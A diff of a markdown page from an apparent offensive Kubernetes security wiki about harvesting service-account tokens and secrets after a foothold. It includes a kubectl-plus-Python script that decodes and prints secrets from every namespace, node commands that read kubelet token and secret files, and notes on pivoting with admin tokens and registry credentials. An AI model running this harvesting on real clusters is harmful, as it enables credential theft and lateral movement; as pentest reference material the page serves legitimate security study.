@@ -1,33 +1,50 @@
 ---
-title: "Token and secret theft: collecting identities across the cluster"
-description: "Collecting credentials across a Kubernetes cluster after a foothold: service-account tokens mounted into pods, secrets readable through the API or on the node, and the materialized secret volumes on a node, each granting a new identity to move with."
+title: "Token and secret theft: harvesting credentials across namespaces"
+description: "Kubernetes secrets hold service-account tokens, registry credentials, TLS keys, and application passwords. An identity that can read secrets, or that reaches them through etcd or node access, harvests them across namespaces to collect tokens for more privileged identities and credentials for backend systems, fuelling further lateral movement."
 keywords:
-  - token theft
   - secret theft
-  - mounted secrets
-  - kubelet secrets
+  - service account token
+  - cross-namespace
+  - credentials
   - lateral movement
 ---
 
 # Token and secret theft
 
-Credentials are scattered across a cluster: every pod mounts a service-account token, secrets hold application and registry credentials, and a node materializes the secrets of every pod it runs. Sweeping them up yields the identities to move laterally and escalate.
+Secrets are where Kubernetes concentrates credentials: service-account tokens, image-pull credentials, TLS private keys, and whatever applications store there such as database and cloud passwords. Harvesting them is the fuel for lateral movement, because a secret read in one namespace frequently contains a token for a more privileged identity or the password to a backend that leads elsewhere. The access can come from the API (with secret-read rights), from etcd, or from a node.
 
 ```bash
-# From API access: read secrets and token-type secrets
-kubectl get secrets -A -o json | jq -r '.items[]|.metadata.namespace+"/"+.metadata.name+" "+.type'
+# via the API, across every namespace the identity can read
+kubectl get secrets -A -o json > secrets.json
+python3 - <<'PY'
+import json,base64
+for s in json.load(open("secrets.json"))["items"]:
+    ns=s["metadata"]["namespace"]; nm=s["metadata"]["name"]; t=s.get("type","")
+    for k,v in (s.get("data") or {}).items():
+        try: val=base64.b64decode(v).decode("utf-8","replace")
+        except Exception: continue
+        if k=="token" or any(x in k.lower() for x in ("pass","key","secret",".dockerconfigjson")):
+            print(ns, nm, t, k, "=", val[:70])
+PY
+```
 
-# From a node foothold: every mounted secret on the node
-find /var/lib/kubelet/pods -path '*volumes/kubernetes.io~secret/*' -type f 2>/dev/null
+## Other sources of the same secrets
+
+```bash
+# from a node: every pod's projected token and mounted secrets
+cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null
+find /var/lib/kubelet/pods -path '*kubernetes.io~secret*' -type f 2>/dev/null
+# from etcd: the raw store, bypassing RBAC entirely (see the etcd page)
 ```
 
 ## Exploitation notes
 
-- A node holds the secrets of all pods scheduled on it, so one node foothold often harvests many identities at once.
-- Prioritize tokens whose service accounts hold broad RBAC; test each with `auth can-i --list`.
-- Feed the strongest token into [Service account token to API](service-account-token-to-api.md) and the registry creds into image access.
+- Prioritise `token`-keyed and `kubernetes.io/service-account-token` secrets: each is a usable identity, and one bound to an admin role is cluster compromise; decode and test with `auth can-i --list`.
+- `.dockerconfigjson` secrets are registry credentials that pivot into the image supply chain; TLS secrets expose private keys for cluster services.
+- Cross-namespace read is the force multiplier; a role that allows `get secrets` cluster-wide turns this into harvesting every identity at once, see [Over-permissive roles](../rbac-privilege-escalation/over-permissive-roles.md).
+- Node and etcd access expose the same secrets without API rights; see [Kubelet credential theft](../pod-escape-to-node/kubelet-credential-theft.md) and [etcd](../exposed-components/etcd.md).
 
 ## References
 
 - [Kubernetes: secrets](https://kubernetes.io/docs/concepts/configuration/secret/)
-- [Kubernetes: service account tokens](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
+- [HackTricks: Kubernetes secrets](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
